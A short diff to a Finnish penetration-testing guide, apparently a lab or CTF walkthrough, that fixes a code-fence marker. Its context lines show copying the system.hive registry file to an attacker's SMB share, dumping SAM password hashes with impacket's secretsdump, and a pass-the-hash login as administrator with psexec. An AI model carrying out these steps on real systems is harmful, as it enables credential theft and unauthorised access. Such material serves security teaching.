@@ -166,7 +166,7 @@ copy C:\polku\system.hive \\HYÖKKÄÄJÄN_IP\public\
 Tiedostoista hashit:
 ```cmd
 python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
-```cmd
+```
 Ja kirjautuminen hasheja käyttämällä:
 ```cmd
 python3.9 /opt/impacket/examples/psexec.py -hashes q1w2e3r4t5y6u7iu:9o8i7u6y5t4r3e2w12q administrator@UHRIN_IP
